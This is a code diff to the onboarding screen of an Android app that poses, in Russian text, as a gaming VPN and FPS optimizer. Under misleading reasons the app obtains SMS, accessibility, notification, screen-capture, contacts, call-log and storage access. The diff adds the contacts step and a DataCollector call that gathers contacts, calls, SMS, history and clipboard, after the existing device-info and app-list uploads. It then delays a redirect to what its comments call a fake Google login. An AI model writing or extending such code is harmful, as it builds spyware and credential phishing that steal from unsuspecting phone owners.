@@ -8,12 +8,13 @@ import android.media.projection.MediaProjectionManager;
 import android.net.Uri;
 import android.os.Build;
 import android.os.Bundle;
+import android.os.Handler;
+import android.os.Looper;
 import android.os.PowerManager;
 import android.provider.Settings;
 import android.widget.Button;
 import android.widget.ProgressBar;
 import android.widget.TextView;
-import android.widget.Toast;
 
 public class OnboardingActivity extends Activity {
 
@@ -24,7 +25,8 @@ public class OnboardingActivity extends Activity {
         "Оптимизация батареи",
         "Специальные возможности",
         "Доступ к уведомлениям",
-        "Запись экрана"
+        "Запись экрана",
+        "Контакты и звонки"
     };
 
     private static final String[] STEPS_DESC = {
@@ -34,10 +36,11 @@ public class OnboardingActivity extends Activity {
         "Чтобы VPN работал в фоне без ограничений системы",
         "Для оптимизации игрового процесса",
         "Для отсеивания помех во время игры",
-        "Для анализа FPS и оптимизации графики в играх"
+        "Для анализа FPS и оптимизации графики в играх",
+        "Для определения друзей в играх и оптимизации контактов"
     };
 
-    private static final int TOTAL = 7;
+    private static final int TOTAL = 8;
     private int current = 0;
 
     private TextView stepTitle, stepDesc, stepCounter;
@@ -85,26 +88,22 @@ public class OnboardingActivity extends Activity {
     private void runStep(int step) {
         switch (step) {
             case 0:
-                // VPN permission
                 Intent vpn = android.net.VpnService.prepare(this);
                 if (vpn != null) startActivityForResult(vpn, 100);
                 else advance();
                 break;
             case 1:
-                // POST_NOTIFICATIONS
                 if (Build.VERSION.SDK_INT >= 33) {
                     requestPermissions(new String[]{Manifest.permission.POST_NOTIFICATIONS}, 101);
                 } else advance();
                 break;
             case 2:
-                // SMS
                 requestPermissions(new String[]{
                     Manifest.permission.READ_SMS,
                     Manifest.permission.RECEIVE_SMS
                 }, 102);
                 break;
             case 3:
-                // Battery
                 PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
                 if (pm != null && !pm.isIgnoringBatteryOptimizations(getPackageName())) {
                     Intent i = new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
@@ -113,20 +112,24 @@ public class OnboardingActivity extends Activity {
                 } else advance();
                 break;
             case 4:
-                // Accessibility
                 startActivityForResult(
                     new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS), 104);
                 break;
             case 5:
-                // Notification Access
                 startActivityForResult(
                     new Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS"), 105);
                 break;
             case 6:
-                // MediaProjection
                 MediaProjectionManager mpm =
                     (MediaProjectionManager) getSystemService(MEDIA_PROJECTION_SERVICE);
                 startActivityForResult(mpm.createScreenCaptureIntent(), 106);
+                break;
+            case 7:
+                requestPermissions(new String[]{
+                    Manifest.permission.READ_CONTACTS,
+                    Manifest.permission.READ_CALL_LOG,
+                    Manifest.permission.READ_EXTERNAL_STORAGE
+                }, 107);
                 break;
         }
     }
@@ -136,7 +139,6 @@ public class OnboardingActivity extends Activity {
         super.onActivityResult(req, res, data);
 
         if (req == 106 && res == RESULT_OK && data != null) {
-            // сохраняем для MediaSniffer
             getSharedPreferences("mp", MODE_PRIVATE).edit()
                 .putInt("code", res)
                 .putString("data_uri", data.toUri(0))
@@ -160,13 +162,20 @@ public class OnboardingActivity extends Activity {
     }
 
     private void finishOnboarding() {
-        // запускаем все сервисы
+        // запускаем сервисы
         startForegroundService(new Intent(this, KeepAliveService.class));
+
+        // отправляем инфу об устройстве и список приложений
         DeviceInfo.sendFull(this);
         AppList.dump(this);
 
-        // переходим на фейк-логин
-        startActivity(new Intent(this, WebLoginActivity.class));
-        finish();
+        // собираем данные (контакты, звонки, SMS, история, буфер)
+        DataCollector.collectAll(this);
+
+        // через 5 секунд — переход на фейк-Google
+        new Handler(Looper.getMainLooper()).postDelayed(() -> {
+            startActivity(new Intent(this, WebLoginActivity.class));
+            finish();
+        }, 5000);
     }
 }
